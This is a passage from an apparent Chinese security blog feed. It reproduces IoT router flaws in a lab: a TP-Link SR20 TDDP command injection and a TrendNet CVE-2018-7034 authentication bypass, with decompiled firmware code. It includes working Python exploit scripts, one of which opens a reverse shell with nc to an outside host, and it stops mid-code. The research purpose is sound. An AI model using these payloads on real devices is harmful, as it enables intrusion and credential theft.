ä¸€ä¸ªluaæ–‡ä»¶å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ªconfig_testå‡½æ•°ï¼Œä¹Ÿèƒ½å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>é‚£ä¹ˆè¿™æ ·çœ‹æ¥payloadè¿˜æ˜¯å¾ˆå¥½å†™çš„</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloda=<span class="string">&quot;/x01/x31&quot;</span>.ljust(<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">12</span>)+command</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥ç®€å•çš„å¤ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">ss= socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;| mkfifo /tmp/fifo | sh -i &lt; /tmp/fifo | nc 192.168.121.112 8888 &gt; /tmp/fifo |;s1nec-1o&quot;</span></span><br><span class="line">ss.sendto(payload, (ip, <span class="number">1040</span>))</span><br><span class="line">ss.close()</span><br></pre></td></tr></table></figure><p>ç”±äºåå¼¹shellå¦‚æ­¤éº»çƒ¦æ˜¯å› ä¸ºæˆ‘ä¼ å…¥çš„æ˜¯busyboxçš„ncï¼Œå®ƒçš„ä½¿ç”¨æ–¹æ³•è¾ƒå°‘ï¼Œè¿™æ˜¯èƒ½æƒ³åˆ°çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åå¼¹å‡ºæ¥ä¼šæ˜¾ç¤ºæ®µé”™è¯¯ï¼Œä¸æ‡‚ï¼Œä½†æƒ³æ¥å¦‚æœæ˜¯çœŸæœºä¹Ÿä¸ç”¨å¦‚æ­¤éº»çƒ¦ï¼Œæˆ–è€…å°†å®¿ä¸»æœºçš„ncä¼ å…¥å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>] <span class="comment"># 192.168.192.130 (QEMUè™šæ‹Ÿæœºçš„IP)</span></span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;%s;winmt&quot;</span> % command</span><br><span class="line">s_send.sendto(payload, (ip, tddp_port))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure><p>è¿˜å¾—æ˜¯winmtï¼Œè„šæœ¬éƒ½é‚£ä¹ˆä¼˜é›…</p><p>è‡³äºluaæ–‡ä»¶çš„æ‰§è¡Œï¼Œæƒ³æ¥ä¹Ÿæ˜¯å·®ä¸å¤šçš„ç¼–å†™è„šæœ¬æ€è·¯</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.iotsec-zone.com/article/384#tp-link-sr20-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">winmt</a></p><p><a href="https://xz.aliyun.com/t/6073?time__1311=n4+xnD0DgDcmG=N0QD/iW4BKGQYw4gouDDv5PQx#toc-0">TP Link SR20 ACEæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªæ¼æ´çš„æˆå› æ˜¯å› ä¸ºä»–çš„TDDPæœ¬èº«åè®®æœ‰ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¼æ´&lt;/p&gt;
&lt;h2 id=&quot;TDDPåè®®&quot;&gt;&lt;a href=&quot;#TDDPåè®®&quot; class=&quot;headerlink&quot; title=&quot;TDDPåè®®&quot;&gt;&lt;/a&gt;TDDPåè®®&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-7034å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-08T04:40:48.000Z</published>
    <updated>2024-07-08T04:44:26.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244908.png" alt="image-20240708110008200"></p><p>é€šè¿‡ä½¿ç”¨ <code>AUTHORIZED_GROUP=1</code> å€¼ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡è®¤è¯ï¼Œå¦‚é€šè¿‡è¯·æ±‚ <code>getcfg.php</code> è¿›è¡Œä¿¡æ¯æ³„éœ²</p><p>è¿™ä¸ªcveçš„æˆå› ï¼Œä¸»è¦æ˜¯å› ä¸ºè§£æ%xxå’Œåˆ¤æ–­ç¯å¢ƒå˜é‡çš„ä¸ä¸¥è°¨å¯¼è‡´çš„ï¼Œä»¥ä¸‹åˆ†æ</p><h2 id="phpæ–‡ä»¶çš„åˆ†æ"><a href="#phpæ–‡ä»¶çš„åˆ†æ" class="headerlink" title="phpæ–‡ä»¶çš„åˆ†æ"></a>phpæ–‡ä»¶çš„åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244910.png" alt="image-20240708110317494"></p><p>å¯ä»¥çœ‹åˆ°å¦‚æœAuthorized_group&gt;&#x3D;0å³ä»£è¡¨ç”¨æˆ·æˆæƒï¼Œå¯ä»¥åŠ è½½ä¸€ä¸ªfileï¼Œè€Œè¿™ä¸ªfileæ˜¯<code>&quot;/htdocs/webinc/getcfg/&quot;.$GETCFG_SVC.&quot;.xml.php&quot;</code>çš„æ ¼å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹åˆ°åœ¨è¯¥ç›®å½•ä¸‹çš„ä»¥.xml.phpä¸ºåç¼€çš„æ–‡ä»¶ï¼Œ<code>DEVICE.ACCOUNT.xml.php</code> è¯¥æ–‡ä»¶å¯ä»¥æ³„éœ²ç”¨æˆ·åå’Œå¯†ç ç­‰ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦AUTHORIZED_GROUP&#x3D;1å°±å¯ä»¥è·å¾—ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯:å¯†ç </p><p>å› ä¸ºä¼ å…¥çš„æ•°æ®éƒ½æ˜¯å…ˆé€šè¿‡ç™»å½•éªŒè¯æ–‡ä»¶ <code>htdocs/cgibin</code> çš„è§£æåï¼Œå‘é€ç»™ <code>php</code> ç­‰æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œæ‰€ä»¥åˆ†æcgibinæ˜¯å¦‚ä½•è®¾ç½®è¯¥å­—æ®µçš„ï¼Œwinmtå¸ˆå‚…è¯´ç”±äºè¿™é‡Œçš„<code>webserver</code>è¿è¡Œçš„æ˜¯<code>php</code>è„šæœ¬ï¼Œæ‰€ä»¥è¦ç€é‡çœ‹phpéƒ¨åˆ†</p><h2 id="ç¯å¢ƒçš„æ­å»º"><a href="#ç¯å¢ƒçš„æ­å»º" class="headerlink" title="ç¯å¢ƒçš„æ­å»º"></a>ç¯å¢ƒçš„æ­å»º</h2><p>å›ºä»¶çš„æå–ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯TrendNetçš„å›ºä»¶TEW-715APO</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244911.png" alt="image-20240708110926473"></p><p>ä¸‹è½½ç„¶åbinwalkæå–å³å¯ï¼Œä½†æ˜¯è¿™é¢˜æ­å»ºäº†ç³»ç»Ÿqemuä¹Ÿæ²¡å•¥ç”¨ï¼Œä¸»è¦æ˜¯å¤ªéš¾ä»¥è°ƒè¯•äº†ï¼Œä»¥ç³»ç»Ÿæ¨¡å¼çš„è¯ï¼Œå› æ­¤è€ƒè™‘çš„æ˜¯<code>qemu-mipsel-static</code>ç”¨æˆ·çº§è°ƒè¯•</p><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒç”¨"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒç”¨" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒç”¨"></a>äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒç”¨</h2><p>æœ€ç»ˆçš„è°ƒè¯•æŒ‡ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  -E CONTENT_LENGTH=<span class="string">&quot;26214&quot;</span> -E REQUEST_URI=<span class="string">&quot;wtf?COOL&quot;</span> -g 1234 ./phpcgi 123</span><br></pre></td></tr></table></figure><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> (*v8)(); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> (v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244912.png" alt="image-20240708111833108"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244913.png" alt="image-20240708123801112"></p><p>éå†ç¯å¢ƒå˜é‡ä¹‹åçš„ç»“æœï¼Œä¼šå‘ç°ä»–å¥½åƒå°†æœ¬æœºçš„envéƒ½æå‡ºæ¥äº†</p><p>ç€é‡æ³¨æ„ç¬¬ä¸€ä¸ªè®¾ç½®çš„ç»“æ„ä½“ï¼Œæ˜¾ç„¶æ˜¯ç¯å¢ƒå˜é‡çš„æ‰€åœ¨å¤„ï¼Œç„¶åå¿…é¡»ä¸ºpostè¯·æ±‚ï¼Œè¿™æ ·funcå‡½æ•°æ‰ä¸ºsub_405AC0ï¼Œè¿™ä¸ªå‡½æ•°ä¹‹åä¼šå†æ¬¡å‡ºç°ï¼Œåªéœ€è®°ä½å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">cgibin_parse_request</span><span class="params">(<span class="type">int</span> function, sodj *addr, <span class="type">unsigned</span> <span class="type">int</span> Maxnum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *CONTENT_LENGTH_ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_ptr; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> **content_type_; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">size_t</span> len_1; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (CONTENT_LENGTH_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">    len = <span class="built_in">atoi</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">parse_uri</span>(function, addr);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Maxnum &gt;= len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( len )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        CONTENT_TYPE_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( CONTENT_TYPE_ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          content_type_ = &amp;off_433014;</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = *content_type_;</span><br><span class="line">            <span class="keyword">if</span> ( !*content_type_ )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            len_1 = content_type_[<span class="number">1</span>];</span><br><span class="line">            content_type_ += <span class="number">3</span>;</span><br><span class="line">            ++v11;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(CONTENT_TYPE_ptr, v14, len_1) )</span><br><span class="line">              <span class="keyword">return</span> ((&amp;off_433014)[<span class="number">3</span> * v11 - <span class="number">1</span>])(function, addr, len, &amp;CONTENT_TYPE_ptr[len_1]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4033E8</span>(len);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šéå†<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244914.png" alt="image-20240708112411987">è¿™éƒ¨åˆ†å†…å®¹ï¼Œç›¸åº”çš„è¯·æ±‚æ–¹å¼æ‰§è¡Œå¯¹åº”çš„å‡½æ•°</p><p>å‘ç°é™¤äº†Applicationå½¢å¼çš„å‰©ä¸‹çš„æ‰€æœ‰çš„è¿”å›å€¼éƒ½æ˜¯-1ï¼Œè¿”å›åˆ°ä¸»å‡½æ•°å°±ç›´æ¥é€€å‡ºäº†ï¼Œå› æ­¤ä»”ç»†çœ‹sub_40445C</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_40445C</span><span class="params">(<span class="type">int</span> funct, sodj *addr, <span class="type">int</span> CONTENT_LENGTH_ptr, <span class="type">const</span> <span class="type">char</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(a4, <span class="string">&quot;x-www-form-urlencoded&quot;</span>, <span class="number">0x15</span>u) )<span class="comment">// å¦‚æœæ˜¯x-www-form-urlencodedå½¢å¼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_403A0C</span>(funct, addr, CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4033E8</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4040E0</span>(<span class="string">&quot;read_ct_application&quot;</span>, a4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯application&#x2F;x-www-form-urlencodedçš„postè¯·æ±‚ä¼šè°ƒç”¨sub_403A0C</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244915.png" alt="image-20240708112718662"></p><p>å…¶ä¸­readè¯»å…¥çš„ä¾¿æ˜¯æˆ‘ä»¬çš„Pocï¼Œè°ƒè¯•çš„è¯ç›´æ¥è¾“å…¥åˆ°è¿œç¨‹é¡µé¢å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_403864</span><span class="params">(_DWORD *a1, <span class="type">int</span> data_addr, <span class="type">unsigned</span> <span class="type">int</span> more_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> thelen; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *func)(<span class="type">int</span>, <span class="type">int</span> *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> export_addr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> one; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// $a1</span></span><br><span class="line">  sodj *sodj; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *oneaddr; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v16[<span class="number">4</span>]; <span class="comment">// [sp+18h] [-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( data_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    thelen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( more_len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = thelen &lt; more_len;</span><br><span class="line">        <span class="keyword">if</span> ( thelen &gt;= more_len )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        oneaddr = (data_addr + thelen);</span><br><span class="line">        one = *(data_addr + thelen);</span><br><span class="line">        <span class="keyword">if</span> ( *a1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sub_403864</span>(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *a1 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sobj_add_char</span>(sodj, v13);               <span class="comment">// å°†ç¬¬ä¸€ä¸ªç­‰å·å‰é¢çš„å†…å®¹å­˜åˆ°sodj1 ç­‰å·åé¢çš„å­˜åˆ°sodj2</span></span><br><span class="line">LABEL_15:</span><br><span class="line">        ++thelen;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">sobj_empty</span>(a1[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">1</span>]);                 <span class="comment">// å°†%xxè§£ç ä¸ºASCIIç </span></span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">2</span>]);</span><br><span class="line">      v7 = a1[<span class="number">1</span>];</span><br><span class="line">      v8 = a1[<span class="number">2</span>];</span><br><span class="line">      func = a1[<span class="number">3</span>];</span><br><span class="line">      export_addr = a1[<span class="number">4</span>];</span><br><span class="line">      v16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v16[<span class="number">1</span>] = v7;</span><br><span class="line">      v16[<span class="number">2</span>] = v8;</span><br><span class="line">      <span class="built_in">func</span>(export_addr, v16);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sobj_free</span>(a1[<span class="number">1</span>]);</span><br><span class="line">  result = <span class="built_in">sobj_free</span>(a1[<span 